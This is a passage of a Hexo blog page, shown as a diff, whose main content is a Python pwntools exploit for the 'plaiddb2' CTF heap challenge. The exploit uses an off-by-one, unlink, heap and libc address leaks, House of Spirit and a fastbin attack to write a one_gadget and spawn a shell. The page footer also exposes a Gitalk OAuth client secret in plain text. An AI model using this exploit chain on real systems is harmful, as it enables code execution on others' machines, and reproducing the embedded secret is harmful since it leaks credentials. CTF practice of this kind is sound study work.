class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p&#x3D;process(&quot;.&#x2F;plaiddb2&quot;)</span><br><span class="line">bin&#x3D;ELF(&quot;.&#x2F;plaiddb2&quot;)</span><br><span class="line">libc&#x3D;ELF(&quot;libc.so.6&quot;)</span><br><span class="line">#context.log_level&#x3D;&#39;Debug&#39;</span><br><span class="line">#gdb.attach(p)</span><br><span class="line"></span><br><span class="line">def PUT(row_key,size,data):</span><br><span class="line">    p.recvuntil(&quot;PROMPT: Enter command:&quot;)</span><br><span class="line">    p.sendline(&quot;PUT&quot;)</span><br><span class="line">    p.recvuntil(&quot;PROMPT: Enter row key:&quot;)</span><br><span class="line">    p.sendline(row_key);</span><br><span class="line">    p.recvuntil(&quot;PROMPT: Enter data size:&quot;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(&quot;PROMPT: Enter data:&quot;)</span><br><span class="line">    p.sendline(data)</span><br><span class="line">def GET(row_key):</span><br><span class="line">    p.recvuntil(&quot;PROMPT: Enter command:&quot;)</span><br><span class="line">    p.sendline(&quot;GET&quot;)</span><br><span class="line">    p.recvuntil(&quot;PROMPT: Enter row key:&quot;)</span><br><span class="line">    p.sendline(row_key)</span><br><span class="line">    #p.recvuntil(&quot; bytes]:&quot;)</span><br><span class="line">    #data&#x3D;p.recv(size)</span><br><span class="line">    #return data</span><br><span class="line">def DEL(row_key):</span><br><span class="line">    p.recvuntil(&quot;PROMPT: Enter command:&quot;)</span><br><span class="line">    p.sendline(&quot;DEL&quot;)</span><br><span class="line">    p.recvuntil(&quot;PROMPT: Enter row key:&quot;)</span><br><span class="line">    p.sendline(row_key)</span><br><span class="line"></span><br><span class="line">PUT(&quot;d&quot;*8,2,&#39;D&#39;)</span><br><span class="line">PUT(&quot;a&quot;*8,128,&#39;A&#39;*128)</span><br><span class="line">PUT(&quot;b&quot;*8,2,&#39;B&#39;)</span><br><span class="line">PUT(&quot;c&quot;*8,2,&#39;C&#39;)</span><br><span class="line">PUT(&quot;b&quot;*8,248,&#39;B&#39;*248) </span><br><span class="line">PUT(&quot;c&quot;*8,280,&#39;C&#39;*248+p64(0x21)+&#39;C&#39;*24) #for next size check #invalid next size (normal) </span><br><span class="line">                    #off by one --&gt; (size--)  --&gt;(next chunk address++)</span><br><span class="line">DEL(&quot;b&quot;*8)</span><br><span class="line">DEL(&#39;X&#39;*240+p64(752)) #240+8&#x3D;248   &lt;--!off by one </span><br><span class="line">DEL(&quot;a&quot;*8)</span><br><span class="line">DEL(&quot;c&quot;*8)</span><br><span class="line"></span><br><span class="line">DEL(&quot;d&quot;*8)</span><br><span class="line">PUT(&quot;KEY1&quot;,1000,(&quot;K&quot;*264+p64(64)+p64(0)+&quot;K&quot;*48+p64(33)+p64(0)+&quot;K&quot;*24+&quot;KEY1\x00&quot;).ljust(999,&quot;\x01&quot;)) # &lt;--cause unlink</span><br><span class="line">PUT(&quot;LEAKBUF&quot;,8,&#39;LEAKBUF&#39;)</span><br><span class="line"></span><br><span class="line">DEL(&quot;123&quot;)#Avoid next chunk size check</span><br><span class="line">GET(&quot;KEY1&quot;)</span><br><span class="line">p.recvuntil(&quot; bytes]:&quot;)</span><br><span class="line">KEY1&#x3D;p.recv(1000)</span><br><span class="line"></span><br><span class="line">#print &quot;KEY1&#x3D;&quot;+str(KEY1)</span><br><span class="line"></span><br><span class="line">#LEAK HEAP</span><br><span class="line">LEAK_HEAP&#x3D;u64(KEY1[273:280].ljust(8,&quot;\x00&quot;))</span><br><span class="line">HEAP_ADDR&#x3D;LEAK_HEAP-0xf0</span><br><span class="line">print &quot;HEAP_ADDR&#x3D;&quot;+hex(HEAP_ADDR) #TreeNode-&gt;row_key-offset</span><br><span class="line"></span><br><span class="line">#LEAK FUNCTION</span><br><span class="line">def LEAK(addr):</span><br><span class="line">    size&#x3D;0x100</span><br><span class="line">    PUT(&quot;KEY1&quot;,1000,&quot;A&quot;*999)</span><br><span class="line">    PUT(&quot;KEY1&quot;,1000,KEY1[1:281]+p64(size)+p64(addr)+KEY1[297:]) </span><br><span class="line">    return GET(&quot;LEAKBUF&quot;)</span><br><span class="line">LEAK(HEAP_ADDR+0x588)</span><br><span class="line">p.recvuntil(&quot;bytes]:&quot;)</span><br><span class="line">LEAK_ADDR&#x3D;p.recv(0x100)</span><br><span class="line">LIBC_ADDR&#x3D;u64(LEAK_ADDR[1:8].ljust(8,&quot;\x00&quot;))-0x3be7b8</span><br><span class="line">print &quot;LIBC_ADDR&#x3D;&quot;+hex(LIBC_ADDR)</span><br><span class="line"></span><br><span class="line">#House of Spirit</span><br><span class="line">fake_chunk&#x3D;HEAP_ADDR+0x2f0</span><br><span class="line">one_gadget&#x3D;0xe58c5+LIBC_ADDR</span><br><span class="line">address&#x3D;LIBC_ADDR+0x3BE740-35#address&#x3D;0x66666666</span><br><span class="line"></span><br><span class="line">PUT(&quot;KEY1&quot;,1000,&quot;A&quot;*1000)</span><br><span class="line">PUT(&quot;KEY1&quot;,1000,KEY1[1:289]+p64(fake_chunk)+KEY1[297:369]+p64(0)+p64(0x70)+p64(0x70)*16+KEY1[513:]) #0x70 to pass the fast bin next chunk check</span><br><span class="line">DEL(&quot;LEAKBUF&quot;)</span><br><span class="line">GET(&quot;KEY1&quot;)</span><br><span class="line">p.recvuntil(&quot; bytes]:&quot;)</span><br><span class="line">KEY1&#x3D;p.recv(1000)</span><br><span class="line">#PUT(&quot;KEY1&quot;,1000,&quot;A&quot;*1000)</span><br><span class="line">DEL(&quot;KEY1&quot;)</span><br><span class="line">PUT(&quot;KEY1&quot;,1000,KEY1[1:385]+p64(address)+KEY1[393:])</span><br><span class="line"></span><br><span class="line">#fastbin attack</span><br><span class="line">PUT(&quot;Fill&quot;,0x60,&quot;F&quot;*0x60)#malloc fake_chunk</span><br><span class="line">PUT(&quot;Fill2&quot;,0x60,&quot;F&quot;*(35-16)+p64(one_gadget)+&quot;F&quot;*(0x60-(35-16)-8)) #any address write</span><br><span class="line"></span><br><span class="line">DEL(&quot;GetSHELL&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/12/25/AFL-FUZZ/" data-id="ck4pciqo1001pvx2s6wf42mei"
+         class="article-share-link">Share</a>
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/FUZZ/" rel="tag">FUZZ</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HEAP/" rel="tag">HEAP</a></li></ul>
+
+    </footer>
+
+  </div>
+
+  
+    
+  <nav class="article-nav">
+    
+      <a href="/2099/12/14/Diary/" class="article-nav-link">
+        <strong class="article-nav-caption">Newer posts</strong>
+        <div class="article-nav-title">
+          
+            Diary
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2019/12/21/Shellcode-Write/" class="article-nav-link">
+        <strong class="article-nav-caption">Olde posts</strong>
+        <div class="article-nav-title">一步步编写Shellcode</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+    
+  <div class="gitalk" id="gitalk-container"></div>
+  
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+
+  
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+  
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+
+  <script type="text/javascript">
+    var gitalk = new Gitalk({
+      clientID: '5ae4e05700db25ed5406',
+      clientSecret: '8a38a8cb845b0b6198a0c59cab9df498ac778343',
+      repo: 'migraine-sudo.github.io',
+      owner: 'migraine-sudo',
+      admin: ['migraine-sudo'],
+      // id: location.pathname,      // Ensure uniqueness and length less than 50
+      id: md5(location.pathname),
+      distractionFreeMode: false,  // Facebook-like distraction free mode
+      pagerDirection: 'last'
+    })
+
+  gitalk.render('gitalk-container')
+  </script>
+
+  
+
+</article>
+
+
+
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2019 Migraine</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+
+<aside class="sidebar sidebar-specter">
+  
+    <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/fujiang.jpg" alt="Migraine"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">Home</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">Archives</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/gallery">Gallery</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/about">About</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/tags">Tags</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+          <i class="fe fe-feed"></i>
+        </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+  </aside>
+  
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
